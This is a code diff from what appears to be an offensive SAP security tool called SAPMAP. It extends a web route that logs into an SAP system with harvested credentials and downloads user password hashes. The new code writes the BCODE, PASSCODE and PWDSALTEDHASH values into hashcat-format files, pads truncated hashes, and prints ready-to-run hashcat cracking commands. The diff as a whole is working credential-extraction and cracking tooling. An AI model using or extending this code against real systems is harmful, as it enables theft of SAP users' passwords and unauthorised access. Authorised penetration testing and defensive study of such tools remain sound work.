@@ -1054,19 +1054,102 @@ def create_app(api: SAPMAPApi) -> Bottle:
         def _run():
             creds = node.best_credentials()
             hashes = sapmap_rfc.download_password_hashes(node, creds)
-            if hashes:
-                # Save to file
-                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                outfile = os.path.join(
-                    os.path.dirname(__file__), "states",
-                    f"hashes_{sid}_{ts}.json"
-                )
-                os.makedirs(os.path.dirname(outfile), exist_ok=True)
-                with open(outfile, "w") as f:
-                    json.dump(hashes, f, indent=2)
-                print(f"[+] Hashes saved to {outfile}")
+            if not hashes:
+                return
 
-        _bg(f"{sid}:download_hashes", "Download Hashes", _run)
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            states_dir = os.path.join(os.path.dirname(__file__), "states")
+            os.makedirs(states_dir, exist_ok=True)
+
+            # Save raw JSON
+            json_file = os.path.join(states_dir, f"hashes_{sid}_{ts}.json")
+            with open(json_file, "w") as f:
+                json.dump(hashes, f, indent=2)
+
+            quality = hashes[0].get("hash_quality", "half") if hashes else "half"
+
+            # Generate hashcat-format files
+            bcode_lines = []    # mode 7700 (full) or 7701 (half)
+            passcode_lines = [] # mode 7800 (full) or 7801 (half)
+            issha_lines = []    # mode 10300
+
+            for row in hashes:
+                bname = row.get("BNAME", "").strip()
+                bcode = row.get("BCODE", "").strip()
+                passcode = row.get("PASSCODE", "").strip()
+                pwdsaltedhash = row.get("PWDSALTEDHASH", "").strip()
+
+                if bcode and bname:
+                    if quality == "full":
+                        # Mode 7700: USERNAME$FULL_HEX_HASH
+                        bcode_lines.append(f"{bname}${bcode}")
+                    else:
+                        # Mode 7701: USERNAME$HALF_HEX_HASH_PADDED
+                        padded = bcode.ljust(16, '0')
+                        bcode_lines.append(f"{bname}${padded}")
+
+                if passcode and bname:
+                    if quality == "full":
+                        # Mode 7800: USERNAME$FULL_SHA1_HEX
+                        passcode_lines.append(f"{bname}${passcode}")
+                    else:
+                        # Mode 7801: USERNAME$HALF_SHA1_PADDED
+                        padded = passcode.ljust(40, '0')
+                        passcode_lines.append(f"{bname}${padded}")
+
+                if pwdsaltedhash:
+                    # Mode 10300: raw value as-is
+                    issha_lines.append(pwdsaltedhash)
+
+            # Write hashcat files
+            files_written = []
+            bcode_mode = "7700" if quality == "full" else "7701"
+            passcode_mode = "7800" if quality == "full" else "7801"
+
+            if bcode_lines:
+                f_bcode = os.path.join(states_dir,
+                    f"hashcat_{sid}_bcode_m{bcode_mode}_{ts}.txt")
+                with open(f_bcode, "w") as f:
+                    f.write("\n".join(bcode_lines) + "\n")
+                files_written.append(
+                    f"BCODE (mode {bcode_mode}): {f_bcode}")
+
+            if passcode_lines:
+                f_passcode = os.path.join(states_dir,
+                    f"hashcat_{sid}_passcode_m{passcode_mode}_{ts}.txt")
+                with open(f_passcode, "w") as f:
+                    f.write("\n".join(passcode_lines) + "\n")
+                files_written.append(
+                    f"PASSCODE (mode {passcode_mode}): {f_passcode}")
+
+            if issha_lines:
+                f_issha = os.path.join(states_dir,
+                    f"hashcat_{sid}_issha_m10300_{ts}.txt")
+                with open(f_issha, "w") as f:
+                    f.write("\n".join(issha_lines) + "\n")
+                files_written.append(
+                    f"PWDSALTEDHASH (mode 10300): {f_issha}")
+
+            # Summary
+            print(f"[+] {sid}: Extracted {len(hashes)} users "
+                  f"({quality} hashes)")
+            print(f"    Raw JSON: {json_file}")
+            for fw in files_written:
+                print(f"    {fw}")
+            if bcode_lines:
+                print(f"    Crack BCODE: hashcat -m {bcode_mode} "
+                      f"hashcat_{sid}_bcode_m{bcode_mode}_{ts}.txt "
+                      f"wordlist.txt")
+            if passcode_lines:
+                print(f"    Crack PASSCODE: hashcat -m {passcode_mode} "
+                      f"hashcat_{sid}_passcode_m{passcode_mode}_{ts}.txt "
+                      f"wordlist.txt")
+            if issha_lines:
+                print(f"    Crack iSSHA: hashcat -m 10300 "
+                      f"hashcat_{sid}_issha_m10300_{ts}.txt "
+                      f"wordlist.txt")
+
+        _bg(f"{sid}:download_hashes", "Extract Hashes", _run)
         return json.dumps({"status": "started"})
 
     @app.route("/api/node/<sid>/download_table", method="POST")
